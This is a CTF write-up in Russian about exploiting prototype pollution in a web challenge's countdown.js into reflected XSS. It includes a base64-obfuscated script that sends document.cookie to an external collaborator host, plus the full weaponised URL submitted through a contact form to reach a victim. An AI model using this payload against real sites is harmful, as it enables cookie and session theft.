# Clean Work
Изучая countdown.js видим что объект settings расширяется от параметров передаваемых в запросе. На странице ведется обратный отсчет до даты указанной в параметре data объекта settings.
Так же видим объект unknown_event c закомментированными свойствами started и name. Если startded=true, тогда name добавляется на страницу. 

Изучая init.js находим как параметры из запроса преобразуются в JSON. 
Поскольку settings и unknown_event являются объектами одного типа, у них общий прототип. Добавление свойств в прототип объекта называют атакой prototype pollution - добавляя свойство в прототип одного объета оно становится доступтно для всех объектов этого типа.

Следующим образом можно добавить в свойство `__proto__` произвольный объект и переопределить имеющееся в settings свойство data чтобы запустить событие:
```
http://45.131.97.54:48081/coming-soon.html?__proto__":{"started":1,"name":"lul"},"interval":"5000&update=true&format=on&date=10 april 2022 00:00:00
```

Готовим payload для xss. Чтобы обойти парсер в init.js мы не можем использовать знаки `=`, поэтому "запакуем" js код в base64 и развернем уже на странице:
```js
<script>eval(atob('dmFyIHVybCA9ICdodHRwOi8vN211ZXU2c2ZwMGoyNTJ6anVsMDEycWMzY3VpbDZodTYub2FzdGlmeS5jb20vJzt2YXIgaW1nID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW1nJyk7aW1nLnNyYyA9IHVybCArIGRvY3VtZW50LmNvb2tpZTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGltZyk7'));</script>
```
Код создает объект `<img src=http://collab.burp/document.cookie>`.

Теперь ссылку с reflected xss нужно доставить "жертве". 
Переходим на страницу `http://45.131.97.54:48081/contact.php`.
В поле text помещаем ссылку с полезной нагрузкой для xss:
```
http://45.131.97.54:48081/coming-soon.html?__proto__%22:{%22started%22:1,%22name%22:%22test%3Cscript%3Eeval(atob(%27dmFyIHVybCA9ICdodHRwOi8vN211ZXU2c2ZwMGoyNTJ6anVsMDEycWMzY3VpbDZodTYub2FzdGlmeS5jb20vJzt2YXIgaW1nID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW1nJyk7aW1nLnNyYyA9IHVybCArIGRvY3VtZW50LmNvb2tpZTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGltZyk7%27));%3C/script%3E%22},%22interval%22:%225000%26update=true%26format=on%26date=10%20april%202022%2000:00:00
```
В коллаборатое видим запрос 
```
GET /Flag=deteact%7Bc2bebfbe20ecc889657caa287e20d28f%7D
```

Флаг - deteact{c2bebfbe20ecc889657caa287e20d28f}